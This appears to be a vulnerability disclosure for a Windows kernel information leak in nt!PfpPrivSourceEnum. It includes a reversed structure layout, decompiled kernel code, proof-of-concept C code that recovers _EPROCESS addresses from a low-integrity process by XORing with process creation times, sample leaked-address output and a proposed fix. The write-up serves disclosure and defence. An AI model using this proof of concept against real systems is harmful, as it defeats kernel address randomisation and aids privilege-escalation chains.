@@ -1,0 +1,129 @@
+The "nt!PfpPrivSourceEnum" function is vulnerable to an Information Disclosure bug that allows a normal user running a LOW integrity process to extract addresses of _EPROCESS kernel objects.
+
+The function is protected with few sanitization checks, all of them can be easily bypassed:
+1) A check for input flags. If 3, an STATUS_INVALID_PARAMETER is returned and function fails.
+2) A check for whether the caller's token has the "SeProfileSingleProcessPrivilege" privilege.
+3) A check for whether the caller is an AppContainer token.
+3) A check for whether the caller has access against an object with Null Dacl via "SeIsAppContainerOrIdentifyLevelContext".
+
+The PfpPrivSourceEnum  function is used to enumerate sessions and processes. For each session or process, it extracts some of its key elements e.g. ProcessId, Session Id, etc and stores them in a user-supplied buffer.
+
+The PfpPrivSourceEnum function returns information in an output structure that looks like below:
+00000000 _BUFF_0x60      struc
+00000000 Type            dd ?
+00000004 SessionIdOrProcessId dd ?
+00000008 ImagePathHash   dd ?
+0000000C field_C         db 4 dup(?)
+00000010 CreateTimeXored dq ?
+00000018 SessionGlobalVA dq ?
+00000020 WorkingSetPrivateSize dq ?
+00000028 NumberOfPrivatePages dq ?
+00000030 SessionId       dd ?
+00000034 Description     db 16 dup(?)
+00000044 field_44        dd ?
+00000048 WorkingSetSwapPages dq ?
+00000050 WorkingSetSize  dq ?
+00000058 DeepFreezeState dd ?
+0000005C ProcessAttributes dd ?
+00000060 _BUFF_0x60      ends
+
+Out of the above structure members, "CreateTimeXored", "SessionGlobalVA " are of special interest.
+1) "SessionGlobalVA" is the SessionID of a session or the kernel address of _EPROCESS structure for a process.
+
+If the caller does not have the "SeProfileSingleProcessPrivilege" privilege, Zero is returned in this field for a process. 
+
+
+
+2) "CreateTimeXored" is the kernel address of _EPROCESS structure XORed with the process's creation time.
+
+So, data returned to user in this field is not of any value unless we know of the target process's creation time. Currently, i only know of 2 methods to extract the process creation time:
+A) Via NtQuerySystemInformation with SystemProcessInformation class, this works only for Medium or Above IL processes.
+B) Via ZwQueryInformationProcess with ProcessTimes Class and DesiredAccess set to PROCESS_QUERY_LIMITED_INFORMATION.
+
+
+//---------- Reversed code: Start ----------
+			memset(Buffer60,0,0x60);
+			
+			if(bBypassMinimal)
+			{
+				if(pProcess->Minimal)
+				{
+					goto Next;
+				}
+			}
+			
+			Buffer60.Type = 2;
+			
+			Buffer60.SessionIdOrProcessId = 
+			pProcess->UniqueProcessId;//truncate
+			
+			Buffer60.ImagePathHash = 
+			pProcess->ImagePathHash;
+			
+			
+			//Leak here
+			Buffer60.CreateTimeXored = 
+			(pProcess->CreateTime 
+			^
+			pProcess)
+			& 0x1FFFFFFFFFFFFFFF;//remove last three bits
+			
+			
+			if(bHasPriv)
+			{
+				Buffer60.SessionGlobalVA = 
+				pProcess;
+			}
+//---------- Reversed code: END ----------
+
+
+
+//------------- POC: Start ------------
+		if(Type == 2)//Process
+		{
+				ulonglong Leak = 0;
+
+				//Try Method1
+				ulonglong CreationTime = GetProcessCreateTime_method_1(SessionIdOrProcessId);
+				if(CreationTime)
+				{
+					printf("CreationTime: %I64X\r\n",CreationTime);
+
+					Leak = (XoredCreateTime ^ CreationTime)|0xE000000000000000;
+					printf("_EPROCESS At: %I64X (Method1)\r\n",Leak); 
+				}
+
+				//Now Try Method2
+				CreationTime = GetProcessCreateTime_method_2(SessionIdOrProcessId);
+				if(CreationTime)
+				{
+					printf("CreationTime: %I64X\r\n",CreationTime);
+
+					Leak = (XoredCreateTime ^ CreationTime)|0xE000000000000000;
+					printf("_EPROCESS At: %I64X (Method2)\r\n",Leak); 
+
+				}
+//-------------- POC: END ----------------
+
+
+
+In case the POC is running from an AppContainer, only the _EPROCESS of the current process is returned.
+
+
+//---------- Output --------------
+DoneZwQuerySystemInformation, ret: 0
+Type: 2
+SessionIdOrProcessId: 22D8
+XoredCreateTime: 1E2878EEDB1A9DBE
+SessionGlobalVA: 22D8
+SessionId: 1
+Desc: SystemSuperfet
+CreationTime: 1D7F2ED16642D3E
+_EPROCESS At: FFFF8A03CD7EB080 (Method1)
+CreationTime: 1D7F2ED16642D3E
+_EPROCESS At: FFFF8A03CD7EB080 (Method2)
+
+//--------------------------
+
+Fix:
+Instead of all the above mentioned checks, a simple call for ExIsRestrictedCaller will suffice to make sure the caller is only Medium IL or above.
